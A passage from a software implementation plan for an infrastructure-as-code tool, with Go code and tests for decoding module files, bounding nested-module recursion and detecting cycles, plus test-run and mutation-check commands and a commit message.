	// checker M4 already built, rather than growing a second one (Ruling 3).
	//
	// Sorted by Name.
	Inputs []VariableDecl
	// Resources are the module's own resources, sorted by Name. Stage 5 re-roots
	// each under the instantiating resource's name.
	Resources []*ResourceDecl
	// Modules are this module's own `modules:` entries, sorted by Name. MODULES
	// NEST: §11.3 says a module may declare `modules:`, and spec §7.2 bounds the
	// recursion at depth 32 rather than forbidding it — which is also what gives
	// Ruling 6's depth bound and cycle detector anything to detect.
	Modules []ModuleLoadDecl
	// Outputs are the values this module publishes, sorted by Name.
	Outputs []OutputDecl
	// Origin is the document root. Origin.File is the decoded file's path, which
	// is what stage 5 resolves a nested relative source against — there is
	// deliberately no separate Path field.
	Origin value.Origin
}

// DecodeModule converts one loaded module file into typed declarations (compiler
// stage 2).
//
// Separate from Decode because the documents are different shapes, and because a
// module file is decoded once per SOURCE while Decode runs once per project: two
// resources instantiating the same module share this result and differ only in
// the attributes their callers wrote.
func DecodeModule(f File) (*ModuleFile, diag.Diagnostics) {
	var ds diag.Diagnostics
	out := &ModuleFile{}

	doc := documentRoot(f.Root)
	if doc == nil {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "module file is empty",
			Detail:   "A module declares `inputs`, `resources` and `outputs` (PLAN.md §11.3). An empty one instantiates nothing, so every reference to its outputs would fail with no explanation of why.",
			Action:   "Add a `resources` block, or remove the `modules:` entry that loads this directory.",
			Origin:   value.Origin{File: f.Path},
		})
		return out, ds
	}
	if doc.Kind != yaml.MappingNode {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "module file must be a mapping",
			Detail:   topLevelShapeDetail(File{Path: f.Path, Kind: FileModule}),
			Origin:   originOf(f.Path, doc),
		})
		return out, ds
	}
	out.Origin = originOf(f.Path, doc)

	seenResources := map[string]value.Origin{}
	seenModules := map[string]loadedName{}
	seenInputs := map[string]value.Origin{}
	seenOutputs := map[string]value.Origin{}
	seenBlocks := map[string]value.Origin{}

	for i := 0; i+1 < len(doc.Content); i += 2 {
		key, val := doc.Content[i], doc.Content[i+1]
		keyOrigin := originOf(f.Path, key)

		if first, dup := seenBlocks[key.Value]; dup {
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "`" + key.Value + "` is declared more than once in this module file",
				Detail:   "The last block would silently win, discarding everything in the first. It is also declared at " + describeOrigin(first) + ".",
				Action:   "Merge the two blocks.",
				Origin:   keyOrigin,
			})
			continue
		}
		seenBlocks[key.Value] = keyOrigin

		switch key.Value {
		case "inputs":
			decodeModuleInputs(f.Path, val, out, &ds, seenInputs)
		case "resources":
			decodeResources(f.Path, val, &out.Resources, &ds, seenResources)
		case "modules":
			// Modules nest. Task 2's decoder, not a second one: what a
			// `modules:` entry means must not depend on which document it
			// appears in.
			decodeModuleLoads(f.Path, val, &out.Modules, &ds, seenModules)
		case "outputs":
			decodeOutputs(f.Path, val, out, &ds, seenOutputs)
		default:
			// An ERROR, where decodeDocument's equivalent is a warning. The two
			// surfaces differ: infra.yml's top level is still growing, so a key
			// this version does not know may be one a later version adds, and a
			// warning keeps an older binary usable. A module file's surface is
			// exactly four keys, the blast radius of a typo'd or misplaced block
			// is the WHOLE block silently dropped, and the keys most likely to
			// appear here wrongly — `project`, `variables`, `environments` — are
			// ones §11.3 says a module must never have.
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "unknown key " + strconv.Quote(key.Value) + " in module file",
				Detail:   "A module file declares `inputs`, `resources`, `modules` and `outputs`, and nothing else. A module has no project name, no variables of its own and no environments: the values it sees are its inputs plus the ambient `environment`, `region` and `account` (PLAN.md §11.3).",
				Action:   "Remove " + strconv.Quote(key.Value) + ", or move it under `inputs:` if it is a parameter of this module.",
				Origin:   keyOrigin,
			})
		}
	}

	// Sorted ONCE, here, so no consumer has to, and so two runs of the same
	// module file expand in the same order (invariant 6).
	sort.Slice(out.Inputs, func(i, j int) bool { return out.Inputs[i].Name < out.Inputs[j].Name })
	sort.Slice(out.Resources, func(i, j int) bool { return out.Resources[i].Name < out.Resources[j].Name })
	sort.Slice(out.Modules, func(i, j int) bool { return out.Modules[i].Name < out.Modules[j].Name })
	sort.Slice(out.Outputs, func(i, j int) bool { return out.Outputs[i].Name < out.Outputs[j].Name })
	return out, ds
}

// decodeModuleInputs decodes a module's `inputs:` block: typed declarations,
// identical in shape to infra.yml's `variables:` (PLAN.md §11.3).
//
// It reuses decodeVariable so an input's `type`, `default`, `min` and `max` mean
// exactly what a variable's do — and so stage 5 can type an input with
// variables.Schemas rather than a second checker (contract Ruling 3). The
// declNoun is what keeps the diagnostics talking about inputs.
func decodeModuleInputs(path string, node *yaml.Node, out *ModuleFile, ds *diag.Diagnostics, seen map[string]value.Origin) {
	if node.Kind != yaml.MappingNode {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "`inputs` must be a mapping of input name to declaration",
			Detail:   "Each input is a key with `type`, `default`, `min` and `max` beneath it (PLAN.md §11.3).",
			Action:   "Write `replicas:` with `type: integer` beneath it, for example.",
			Origin:   originOf(path, node),
		})
		return
	}

	for i := 0; i+1 < len(node.Content); i += 2 {
		nameNode, body := node.Content[i], node.Content[i+1]
		origin := originOf(path, nameNode)

		if first, dup := seen[nameNode.Value]; dup {
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "input " + strconv.Quote(nameNode.Value) + " is declared more than once",
				Detail:   "The last declaration would silently win, discarding a type or a bound. " + strconv.Quote(nameNode.Value) + " is also declared at " + describeOrigin(first) + ".",
				Action:   "Remove one of the two declarations, or merge them.",
				Origin:   origin,
			})
			continue
		}
		seen[nameNode.Value] = origin
		out.Inputs = append(out.Inputs, decodeVariable(path, nameNode.Value, body, origin, inputNoun, ds))
	}
}

func decodeOutputs(path string, node *yaml.Node, out *ModuleFile, ds *diag.Diagnostics, seen map[string]value.Origin) {
	if node.Kind != yaml.MappingNode {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "`outputs` must be a mapping of output name to declaration",
			Detail:   "Each output is a key with `value:` beneath it (PLAN.md §11.3).",
			Action:   "Write `endpoint:` with `value: ${service.endpoint}` beneath it, for example.",
			Origin:   originOf(path, node),
		})
		return
	}

	for i := 0; i+1 < len(node.Content); i += 2 {
		nameNode, body := node.Content[i], node.Content[i+1]
		origin := originOf(path, nameNode)

		if first, dup := seen[nameNode.Value]; dup {
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "output " + strconv.Quote(nameNode.Value) + " is declared more than once",
				Detail:   "The last declaration would silently win, so the module would publish a value its author did not write. " + strconv.Quote(nameNode.Value) + " is also declared at " + describeOrigin(first) + ".",
				Action:   "Remove one of the two declarations.",
				Origin:   origin,
			})
			continue
		}
		seen[nameNode.Value] = origin

		if o, ok := decodeOutput(path, nameNode.Value, body, origin, ds); ok {
			out.Outputs = append(out.Outputs, o)
		}
	}
}

func decodeOutput(path, name string, body *yaml.Node, origin value.Origin, ds *diag.Diagnostics) (OutputDecl, bool) {
	if body.Kind != yaml.MappingNode {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "output " + strconv.Quote(name) + " must be a mapping",
			Detail:   "An output holds a `value:` key. A bare value here would be ambiguous with an output whose value is itself a mapping.",
			Action:   "Write `value:` beneath " + strconv.Quote(name) + ", with the expression under it.",
			Origin:   originOf(path, body),
		})
		return OutputDecl{}, false
	}

	o := OutputDecl{Name: name, Origin: origin}
	var valueNode *yaml.Node
	seenKeys := map[string]value.Origin{}

	for i := 0; i+1 < len(body.Content); i += 2 {
		key, val := body.Content[i], body.Content[i+1]
		keyOrigin := originOf(path, key)
		if first, dup := seenKeys[key.Value]; dup {
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  strconv.Quote(key.Value) + " is set more than once on output " + strconv.Quote(name),
				Detail:   "The last assignment would silently win. " + strconv.Quote(key.Value) + " is also set at " + describeOrigin(first) + ".",
				Action:   "Remove one of the two assignments.",
				Origin:   keyOrigin,
			})
			continue
		}
		seenKeys[key.Value] = keyOrigin

		switch key.Value {
		case "value":
			valueNode = val
		default:
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "unknown key " + strconv.Quote(key.Value) + " in output " + strconv.Quote(name),
				Detail:   "An output declaration understands `value`.",
				Action:   "Remove " + strconv.Quote(key.Value) + ".",
				Origin:   keyOrigin,
			})
		}
	}

	if valueNode == nil {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "output " + strconv.Quote(name) + " has no `value`",
			Detail:   "An output publishes one value to the module's caller, and this one publishes nothing — so a caller reading it would get an unresolvable reference with no explanation.",
			Action:   "Add `value: ${...}` beneath " + strconv.Quote(name) + ", or remove the output.",
			Origin:   origin,
		})
		return OutputDecl{}, false
	}

	if bare, ok := bareReference(valueNode); ok {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "output " + strconv.Quote(name) + " names " + strconv.Quote(bare) + " without `${...}`",
			Detail: "Written bare, " + strconv.Quote(bare) + " is that literal text, not a reference to it, so the module would publish the text " +
				strconv.Quote(bare) + " to its caller. References are written `${...}` everywhere else in the language.",
			Action: "Write `value: ${" + bare + "}` to publish the value it names, or quote it — `value: " + strconv.Quote(bare) + "` — to publish the literal text.",
			Origin: originOf(path, valueNode),
		})
		return OutputDecl{}, false
	}

	o.Value, o.HasExpressions = decodeValue(path, "output "+strconv.Quote(name)+"'s `value`", valueNode, ds)
	return o, true
}

// bareReference reports whether an output's `value:` was written bare —
// `value: service.endpoint` rather than `value: ${service.endpoint}`.
//
// Contract Amendment 4e: `${...}` is this language's only reference syntax, with
// `$${` as its escape, so a bare scalar is a literal everywhere else, and making
// outputs the one exception would be a second reference syntax. Decoding it as an
// ordinary value would publish that literal text with nothing printed; reading any
// dotted scalar as a reference is worse, because `value: production` is an
// ordinary literal output and a dotted one — a version, a hostname — is just as
// ordinary, so that rule makes every dotted literal ambiguous. Guessing between
// the two is precisely what produces a confidently wrong value.
//
// So the bare form is refused and BOTH working spellings are offered.
//
// The test is deliberately narrow: an UNQUOTED string scalar (Style 0, tag !!str)
// of two or more identifier segments. A quoted scalar means the literal, an
// integer or a boolean is not a reference in any spelling, and a single segment
// would collide with an ordinary one-word literal.
//
// identifierSegment is Task 2's, shared so that what counts as a name has one
// definition.
func bareReference(node *yaml.Node) (string, bool) {
	if node.Kind != yaml.ScalarNode || node.Style != 0 || node.Tag != "!!str" {
		return "", false
	}
	segments := strings.Split(node.Value, ".")
	if len(segments) < 2 {
		return "", false
	}
	for _, s := range segments {
		if !identifierSegment(s) {
			return "", false
		}
	}
	return node.Value, true
}
```

#### 3.6 — Run the tests, then prove they discriminate

```bash
go test ./internal/config/ -count=1
go test -race -count=1 ./...
go vet ./... && gofmt -l .
grep -rn "yaml\." --include=*.go internal/ pkg/ cmd/ | grep -v "^internal/config/"
```

**Expected:** every package green, `gofmt -l .` silent, and the `grep` printing nothing — no
`yaml.Node` escaped `internal/config`. **No pre-existing test file may need editing.** If
`decode_variables_test.go` fails, the noun threading changed a message it should not have;
fix the threading, not the test.

Then break each of the three behaviours most at risk of not discriminating:

```bash
sed -i 's/origin, inputNoun, ds)/origin, variableNoun, ds)/' internal/config/module_file.go
go test ./internal/config/ -count=1 -run TestModuleInputDiagnosticsSayInput
```

**Expected: FAIL**, `a module input's diagnostic calls it a variable`. Restore `inputNoun`.

```bash
sed -i 's/^\tif bare, ok := bareReference(valueNode); ok {$/\tif bare, ok := bareReference(valueNode); false \&\& ok {\n\t\t_ = bare/' internal/config/module_file.go
go test ./internal/config/ -count=1 -run TestBareOutputReferenceIsRefused
```

**Expected: FAIL**, `want exactly 1 error, got 0`. Revert that edit by hand (restore the
single `if bare, ok := bareReference(valueNode); ok {` line and delete the `_ = bare` line),
then re-run.

```bash
sed -i '/decodeModuleLoads(f.Path, val, &out.Modules, &ds, seenModules)/d' internal/config/module_file.go
go test ./internal/config/ -count=1 -run 'TestModuleFileAcceptsNestedModules|TestNestedModuleNameCollision'
```

**Expected: BOTH FAIL**, and on the diagnostic rather than on the count — with the line gone
the block falls through to the unknown-key arm, so exactly one error is still produced and it
is the wrong one. The first fails at `requireNoErrors` with
`unexpected errors: [unknown key "modules" in module file]`; the second gets past
`requireErrorAbout`'s count check and fails its fragment check,
`diagnostic does not mention "two modules are both named \"net\""`. Restore the line (it
belongs in the `case "modules":` arm, after its comment) and re-run
`go test ./internal/config/ -count=1`.

#### 3.7 — Commit

```bash
git add internal/config/module_file.go internal/config/module_file_test.go
git add internal/config/load.go internal/config/decode.go
git commit -m "Decode a module file: inputs, resources, nested modules and outputs

A module is a directory containing module.yml, not infra.yml (contract
Amendment 1). Two names make the two document shapes distinguishable by
construction: neither decoder accepts the other's keys, so a module declaring
project: or environments: falls out of the unknown-key diagnostic, which already
names the key and the line, instead of needing four bespoke rules.

Inputs are config.VariableDecl, decoded by the existing decodeVariable, so
stage 5 types them with variables.Schemas rather than a second type checker.
That decoder now takes the noun it is decoding, so a broken module input is
reported as an input and pointed at the resource that instantiates the module
instead of at variables.yml; the project-variable call site passes the strings it
produced before, so every existing message is unchanged.

A bare output value — value: service.endpoint — decodes as that literal string
and would be published to the caller with nothing printed, while reading any
dotted scalar as a reference would break every dotted literal. The bare form is
refused with both working spellings in the action (Amendment 4e).

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>" \
  -- internal/config/module_file.go internal/config/module_file_test.go \
     internal/config/load.go internal/config/decode.go
```

### Notes for the stage-5 tasks and for review

1. **`value: service.endpoint` is refused — RULED, contract Amendment 4e**, and `PLAN.md`
   §11.3 now shows `value: ${service.endpoint}`. This task owns the guard.

2. **A module file's unknown top-level key is an ERROR, where `infra.yml`'s is a warning.**
   Deliberate, reasoned at the code site: `infra.yml`'s surface is still growing, so an
   unknown key there may be one a later version adds; a module file's surface is exactly four
   keys (`inputs`, `resources`, `modules`, `outputs`), and the blast radius of a misplaced
   block is the whole block silently dropped.

3. **`variables.Schemas` still says "variable" — Tasks 4–7 own it, contract Amendment 4f.**
   Stage 2's diagnostics now say "input", but `internal/variables/schema.go`'s do not when a
   supplied value fails its type or its bounds. `declNoun` is unexported in `internal/config`;
   threading it through `internal/variables` needs it exported, or an equivalent there.

4. **Stage 2 REPORTS a bad module source; it does not decide what one is.** Per contract
   Amendment 13d, Task 2 calls `source.Parse` — which is pure, so stage 2 still touches
   neither the filesystem nor the network — and emits its diagnostics, because `Parse` takes
   an origin precisely so they can point at a line and stage 2 is the only stage that has
   one. A missing pin, a refused scheme and `ext::` therefore surface at `infra validate`.

   Stage 2 never splits a source itself and never derives a name itself: both belong to
   `internal/modules/source` (`Parse` and `DeriveName`, contract Amendment 20a). Task 2
   calls them and reports what they return. **Stage 5 receives the already-parsed
   `source.Source`** and hands it to `Cache.Resolve`, so it cannot re-emit a parse
   diagnostic — it never parses (Amendment 15b).

---

## Task 4 — load modules, find instantiations, and bound the recursion

### Why this task exists

Three failures, and they are different in kind.

**A stack overflow with no diagnostic.** A module whose `module.yml` instantiates itself
— directly, or through two others — recurses forever; the directory really is there, so
every load succeeds. Go grows the stack until the runtime kills the process and the user
gets a goroutine dump instead of an error naming the two lines to edit. Spec §7.2 fixes
both bounds and Ruling 6 fixes that they are **two different diagnostics**: one says the
nesting is too deep, the other says it never terminates. Collapsed, a user with a genuine
40-deep tree is sent looking for a cycle that is not there.

**A module call that silently becomes a provider resource.** Stage 5 selects
instantiations by `strings.HasPrefix(r.Type, "module.")` (§8c). If a provider ever
registers a type in that namespace, a user's `type: module.app_stack` becomes a provider
resource and the module is never expanded — a plan that is wrong and looks fine. The
guard belongs in `registry.Register` so it fails in that provider's own tests at startup.

**Raw YAML leaking out of `internal/config`.** Ruling 2 forbids stage 5 from touching a
`yaml.Node`. The tempting shortcut — reading `source:` out of a node in stage 1 and
walking the graph there — is exactly what would put a fourth YAML-handling site outside
`internal/config`. This task establishes the re-entry so the shortcut is never available.

### Files

- create `internal/modules/expand.go`
- create `internal/modules/expand_test.go`
- create `internal/modules/discover.go`
- create `internal/modules/discover_test.go`
- create `internal/modules/testdata_test.go`
- modify `internal/registry/registry.go`, `internal/registry/registry_test.go`

### Interfaces

**Consumes:**

```go
func config.LoadModule(dir string) (config.File, error)
func config.DecodeModule(f config.File) (*config.ModuleFile, diag.Diagnostics)
func (ds diag.Diagnostics) InModule(name string) diag.Diagnostics // Task 9
// plus config.ProjectDecl, config.ModuleFile, config.ModuleLoadDecl,
// config.ResourceDecl, config.ModuleFileName, diag.Diagnostics, value.Origin.
```

**Produces** — Tasks 5, 6 and 7 depend on exactly these:

```go
package modules

// MaxDepth bounds module nesting at 32 instantiations (spec §7.2).
const MaxDepth = 32

// TypePrefix is what marks a resource as a module instantiation (§8c).
const TypePrefix = "module."

// Instance is one resource, flattened out of the module tree.
type Instance struct {
	Decl *config.ResourceDecl
}

// Expansion is stage 5's output.
type Expansion struct {
	// Project is the ROOT project name, carried once per compilation.
	Project string
	// Resolutions is every remote source this walk resolved, deduplicated and
	// sorted — what a mutating command writes to modules.lock. Stage 5 collects
	// and never writes (Amendment 18).
	Resolutions []Resolved
	Instances   []Instance
}

// Resolved is one module source and what it resolved to.
type Resolved struct {
	Source     source.Source
	Resolution source.Resolution
}

// Resolver turns a parsed module source into a local directory — the one place
// internal/modules can reach the network. See the header section.
type Resolver interface {
	Resolve(s source.Source, baseDir string) (source.Resolution, diag.Diagnostics)
}

func Expand(project *config.ProjectDecl, scope variables.Scope, dir string, resolve Resolver) (*Expansion, diag.Diagnostics)
```

`Instance` has no `Address` yet. That is Task 6's whole job, and it is deliberately
ABSENT rather than present-and-wrong: shipping `Address{Name: decl.Name}` for a resource
inside a module would be shipping the silent collision Ruling 1 exists to prevent, and
Task 6's test would then pin a bug fix rather than a contract.

`scope` is threaded through unused here and consumed by Task 5. Declare it now so the
signature Tasks 8–10 wire against does not change under them.

### The rulings this task fixes, and why

1. **The cycle check runs BEFORE the depth check.** A cycle is infinitely deep, so
   depth-first would report "nesting is too deep" for every cycle and make the cycle
   diagnostic unreachable. Pinned by its own test, because it is invisible from reading
   either check alone.

2. **Cycles are keyed on the resolved source DIRECTORY, not the instantiation name.**
   `a` instantiating `b` instantiating `a` is a cycle whatever the three instantiations
   are called, and two instantiations of one source under different names are not a cycle
   at all. A name-keyed check misses the first and falsely reports the second.

3. **The cycle set is the current PATH, pushed and popped** — not everything ever
   visited. A diamond (two branches both instantiating `shared`) is legal and common; an
   append-only visited set would refuse it. This is the shape difference from
   `internal/environments`, below.

4. **The two SHAPE guards of §8c are NOT written here.** `checkResourceType` (Author A,
   Task 2) owns `module.` with nothing after it and a name containing a further `.`.
   Stage 2 holds the line number and a malformed type is a property of the text; a
   stage-5 copy would report that some module does not exist, which is a diagnostic about
   a consequence naming a module name the user never wrote (Amendment 13b). What stage 5
   DOES own is "no module of that name is loaded", because loading is stage 5's job.

5. **`registry.Register` refuses the `module.` namespace** (§8c). Belt-and-braces by
   design: stage 5 runs before stage 7, so a `module.*` type from user config is always
   expanded away before `reg.Definition` is called. What the guard stops is a PROVIDER
   claiming the namespace. The check goes in `Register`'s FIRST loop, beside the existing
   two, because that loop is deliberately validate-before-mutate so a failed registration
   leaves the registry untouched.

### What `internal/environments` can and cannot lend

`internal/environments/resolve.go` detects `extends` cycles and renders them. Read it
first, then share only the rendering, for a reason in the code rather than in the
resemblance:

- **The algorithm does not transfer.** `extends` is *functional* — at most one parent —
  so its walk is a straight line and `seen map[string]int` plus an append-only `order`
  slice is exactly right: nothing is popped because a linear walk never backtracks. The
  module graph branches, so an append-only set would refuse the legal diamond in ruling 3.
  This code pushes and pops.
- **What transfers is the diagnostic shape:** the cycle in participation order with the
  wrap included, `a -> b -> a`, which is also what `graph.Layers` renders. Spec §7.4 asks
  for the full cycle rather than one participant, and asks the three cycle errors in this
  system to read alike. `cycleDiagnostic` takes `[]config.EnvironmentDecl` and could not
  be called from here without a type parameter whose only purpose would be making two
  unrelated walks look like one.

### Steps

#### 4.1 Failing tests

Create `internal/modules/testdata_test.go`:

```go
package modules

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/infrata/infrata/internal/config"
	"github.com/infrata/infrata/internal/diag"
	"github.com/infrata/infrata/internal/modules/source"
)

// writeTree writes a fixture project under dir, creating parent directories.
// Keys are slash-separated paths relative to dir.
func writeTree(t *testing.T, dir string, files map[string]string) {
	t.Helper()
	for rel, body := range files {
		p := filepath.Join(dir, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

// fixture writes a project and runs stages 1 and 2 over it, FAILING if either
// rejects it.
//
// That check is the point of the helper, not a convenience. M4 shipped a test
// whose fixture was rejected by an earlier stage, so the stage-5 guard it named
// was never reached and deleting that guard changed nothing. A fixture that
// does not decode cannot pin anything in this package.
func fixture(t *testing.T, files map[string]string) (*config.ProjectDecl, string) {
	t.Helper()
	dir := t.TempDir()
	writeTree(t, dir, files)

	loaded, err := config.Load(dir)
	if err != nil {
		t.Fatalf("stage 1 rejected the fixture, so no stage-5 guard is reached: %v", err)
	}
	decl, ds := config.Decode(loaded)
	if ds.HasErrors() {
		t.Fatalf("stage 2 rejected the fixture, so no stage-5 guard is reached: %+v", ds)
	}
	return decl, dir
}

// paths is the Resolver every fixture here uses: it joins a local path against
// the base directory and does nothing else.
//
// Injecting it is what keeps stage 5 testable with no network and no cache
// directory. It also makes a fixture that reached for a remote source fail
// loudly rather than quietly fetching — no test in this package should ever
// need one, because Author D's Tasks 11-14 own that behaviour and test it
// against the real cache.
type paths struct{}

func (paths) Resolve(s source.Source, baseDir string) (source.Resolution, diag.Diagnostics) {
	var ds diag.Diagnostics
	if s.Kind != source.KindPath {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "this test resolver handles local paths only, got " + s.String(),
			Origin:   s.Origin,
		})
		return source.Resolution{}, ds
	}
	// No Commit: a local path has no revision to pin, which is why 10a requires
	// a pin on remote sources and not on these.
	return source.Resolution{Dir: filepath.Join(baseDir, s.Location)}, ds
}

// summaries collects every diagnostic summary, for assertions that one
// particular message is ABSENT.
func summaries(ds diag.Diagnostics) []string {
	out := make([]string, 0, len(ds))
	for _, d := range ds {
		out = append(out, d.Summary)
	}
	return out
}

// hasFragment reports whether any diagnostic's Summary or Detail contains want.
func hasFragment(ds diag.Diagnostics, want string) bool {
	for _, d := range ds {
		if strings.Contains(d.Summary, want) || strings.Contains(d.Detail, want) {
			return true
		}
	}
	return false
}
```

Create `internal/modules/expand_test.go`:

```go
package modules

import (
	"fmt"
	"path/filepath"
	"strings"
	"testing"

	"github.com/infrata/infrata/internal/diag"
	"github.com/infrata/infrata/internal/modules/source"
	"github.com/infrata/infrata/internal/variables"
)

// Amendment 18: stage 5 COLLECTS resolutions and never writes them.
//
// fakeGit stands in for a resolved remote, mapping each source to a directory
// the fixture already wrote. It exists because `paths` deliberately refuses a
// non-path source, and because nothing about collection can be tested with
// local paths — a local path has no revision to pin and is skipped.
type fakeGit struct{ dirs map[string]string }

func (f fakeGit) Resolve(s source.Source, baseDir string) (source.Resolution, diag.Diagnostics) {
	var ds diag.Diagnostics
	dir, ok := f.dirs[s.String()]
	if !ok {
		ds.Add(diag.Diagnostic{Severity: diag.SeverityError, Summary: "no fixture for " + s.String()})
		return source.Resolution{}, ds
	}
	return source.Resolution{Dir: filepath.Join(baseDir, dir), Commit: "c-" + dir}, ds
}

func TestResolutionsAreCollectedDeduplicatedAndSorted(t *testing.T) {
	// The fixture CONTRADICTS the expected output twice over. `zeta` is
	// declared first and sorts last; and it is declared TWICE, under two names,
	// so an implementation that appended per Resolve call produces three
	// entries in declaration order. Only dedup-by-source plus one sort gives
	// [alpha, zeta].
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - name: z1
    source: https://github.com/acme/zeta:v1.0.0
  - name: a1
    source: https://github.com/acme/alpha:v1.0.0
  - name: z2
    source: https://github.com/acme/zeta:v1.0.0
resources:
  ca:
    type: module.a1
  cz:
    type: module.z1
  cz2:
    type: module.z2
`,
		"zeta/module.yml":  "resources:\n  z:\n    type: test.thing\n",
		"alpha/module.yml": "resources:\n  a:\n    type: test.thing\n",
	})

	git := fakeGit{dirs: map[string]string{
		"https://github.com/acme/zeta:v1.0.0":  "zeta",
		"https://github.com/acme/alpha:v1.0.0": "alpha",
	}}

	exp, ds := Expand(decl, variables.Scope{}, dir, git)
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	var got []string
	for _, r := range exp.Resolutions {
		got = append(got, r.Source.String()+"="+r.Resolution.Commit)
	}
	want := []string{
		"https://github.com/acme/alpha:v1.0.0=c-alpha",
		"https://github.com/acme/zeta:v1.0.0=c-zeta",
	}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("Resolutions = %v, want %v — keyed by SOURCE identity, so one source loaded "+
			"under two names is one entry, and sorted once because modules.lock is compared "+
			"against on every later run", got, want)
	}
}

func TestLocalPathsProduceNoResolutions(t *testing.T) {
	// A local path has no revision to pin, so it never reaches modules.lock —
	// the same fact 10a leans on when it requires a pin on remote sources and
	// not on these. Without this, the filter could be deleted and every
	// path-only project would write a lock file full of empty commits.
	decl, dir := fixture(t, map[string]string{
		"infra.yml":    "project: demo\nmodules:\n  - ./m\nresources:\n  c:\n    type: module.m\n",
		"m/module.yml": "resources:\n  thing:\n    type: test.thing\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	if len(exp.Resolutions) != 0 {
		t.Errorf("Resolutions = %+v, want none", exp.Resolutions)
	}
}

func TestExpandRecursesThroughNestedInstantiations(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./modules/net
resources:
  gateway:
    type: test.thing
  netA:
    type: module.net
`,
		"modules/net/module.yml": `
modules:
  - ../deep
resources:
  subnet:
    type: test.thing
  inner:
    type: module.deep
`,
		"modules/deep/module.yml": `
resources:
  route:
    type: test.thing
`,
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	got := map[string]bool{}
	for _, inst := range exp.Instances {
		got[inst.Decl.Name] = true
		if strings.HasPrefix(inst.Decl.Type, TypePrefix) {
			t.Errorf("%q survived expansion as a %s resource; a module call must EXPAND, "+
				"never reach the planner", inst.Decl.Name, inst.Decl.Type)
		}
	}
	for _, want := range []string{"gateway", "subnet", "route"} {
		if !got[want] {
			t.Errorf("resource %q missing; stage 5 must recurse through every instantiation, got %v", want, got)
		}
	}
	if len(exp.Instances) != 3 {
		t.Errorf("got %d instances, want 3", len(exp.Instances))
	}
}

func TestExpandRefusesACycleAndShowsIt(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./modules/a
resources:
  alpha:
    type: module.a
`,
		"modules/a/module.yml": "modules:\n  - ../b\nresources:\n  beta:\n    type: module.b\n",
		"modules/b/module.yml": "modules:\n  - ../a\nresources:\n  gamma:\n    type: module.a\n",
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if !ds.HasErrors() {
		t.Fatal("a module instantiating itself transitively must be a diagnostic, not a stack overflow")
	}
	if !hasFragment(ds, "never terminates") {
		t.Errorf("the diagnostic must say the expansion never terminates; got %+v", ds)
	}
	// Spec §7.4: name the full cycle, not one participant.
	if !hasFragment(ds, "alpha (./modules/a) -> beta (../b) -> gamma (../a)") {
		t.Errorf("the diagnostic must render the whole cycle in participation order; got %+v", ds)
	}
}

// The guard-ordering test. A cycle is infinitely deep, so a depth check placed
// first would swallow every cycle and make the cycle diagnostic unreachable.
// Nothing about either check, read alone, reveals that.
func TestExpandReportsACycleAsACycleAndNotAsExcessiveDepth(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": "project: demo\nmodules:\n  - ./modules/a\nresources:\n  alpha:\n    type: module.a\n",
		"modules/a/module.yml": "modules:\n  - ../b\nresources:\n  beta:\n    type: module.b\n",
		"modules/b/module.yml": "modules:\n  - ../a\nresources:\n  gamma:\n    type: module.a\n",
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	for _, s := range summaries(ds) {
		if strings.Contains(s, "deeper than") {
			t.Fatalf("a 3-deep cycle was reported as excessive nesting (%q); the cycle check must run first", s)
		}
	}
}

// chain builds MaxDepth+extra nested modules in DISTINCT directories, so the
// fixture reaches the depth guard rather than tripping the cycle guard on the
// way there.
func chain(depth int) map[string]string {
	files := map[string]string{
		"infra.yml": "project: demo\nmodules:\n  - ./m0\nresources:\n  top:\n    type: module.m0\n",
	}
	for i := 0; i < depth; i++ {
		if i < depth-1 {
			files[fmt.Sprintf("m%d/module.yml", i)] = fmt.Sprintf(
				"modules:\n  - ../m%d\nresources:\n  step:\n    type: module.m%d\n", i+1, i+1)
			continue
		}
		files[fmt.Sprintf("m%d/module.yml", i)] = "resources:\n  leaf:\n    type: test.thing\n"
	}
	return files
}

func TestExpandRefusesNestingDeeperThanMaxDepth(t *testing.T) {
	decl, dir := fixture(t, chain(MaxDepth+1))

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if !ds.HasErrors() {
		t.Fatalf("nesting %d deep must be refused", MaxDepth+1)
	}
	if !hasFragment(ds, "deeper than 32 instantiations") {
